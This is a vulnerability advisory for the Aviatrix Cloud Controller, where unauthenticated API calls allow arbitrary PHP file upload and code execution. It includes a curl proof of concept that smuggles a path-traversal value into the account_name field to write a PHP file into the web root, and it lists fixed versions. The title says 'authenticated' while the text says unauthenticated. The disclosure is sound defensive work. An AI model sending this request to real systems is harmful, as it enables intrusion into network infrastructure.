# Advisory

## Unrestricted upload of file with dangerous type in Aviatrix allows an authenticated user to execute arbitrary code

## Overview

While the Aviatrix UI requires authentication, many API calls do not enforce a check for authentication. Some of these API calls allow an unauthenticated attacker to upload arbitrary files, including `.php` scripts, to the filesystem. These uploaded scripts will be processed by the web frontend, allowing an attacker to run code of their choosing.

## Proof of concept

1. Make the following request to the Aviatrix Cloud Controller `aviatrix`:

```
curl -k https://aviatrix.domain.tld/v1/backend1 -d CID=x -d action=set_metric_gw_selections -d account_name=/../../../var/www/php/test.php -d 'data=hello<?php phpinfo()?>'

```

2. Visit `https://aviatrix.domain.tld/v1/test`. This will show the PHP Version page.

## Mitigation/further actions

Upgrade to one of the following versions:

* UserConnect-6.2-1804.2043 or later
* UserConnect-6.3-1804.2490 or later
* UserConnect-6.4-1804.2838 or later
* UserConnect-6.5-1804.1922 or later
